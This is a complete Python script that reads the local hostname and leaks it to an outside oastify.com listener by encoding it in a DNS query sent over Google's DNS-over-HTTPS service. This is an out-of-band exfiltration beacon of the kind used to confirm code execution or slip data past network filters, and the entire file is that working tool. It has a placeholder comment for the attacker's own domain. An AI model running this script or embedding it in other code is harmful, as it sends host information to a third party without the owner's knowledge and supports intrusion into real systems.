import socket
import base64
import urllib.request
import urllib.parse

# Configuration
MY_DOMAIN = "wffpr1qmre4h8k10ap727ttudljc7fv4.oastify.com"  # Replace with your actual domain placeholder

# Retrieve hostname and construct full domain
hostname = socket.gethostname()
full_domain = f"{hostname}.{MY_DOMAIN}"

# Encode the domain name in DNS wire format (length-prefixed labels + null terminator)
labels = full_domain.split('.')
name_encoded = b''.join(bytes([len(label)]) + label.encode('ascii') for label in labels) + b'\x00'

# DNS message header (transaction ID: 0xabcd, standard query flags, 1 question)
header = b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'

# Question section suffix (A record type: 0x0001, IN class: 0x0001)
tail = b'\x00\x01\x00\x01'

# Assemble full binary DNS message
msg = header + name_encoded + tail

# Encode in base64url format (URL-safe, no padding)
encoded = base64.urlsafe_b64encode(msg).rstrip(b'=').decode('ascii')

# Construct the DoH query URL
url = f"https://dns.google/dns-query?dns={encoded}"

# Perform the HTTP request
req = urllib.request.Request(url, headers={'accept': 'application/dns-message'})
with urllib.request.urlopen(req) as response:
    dns_response = response.read()

# Output the binary DNS response (as in the equivalent curl command)
print(dns_response)
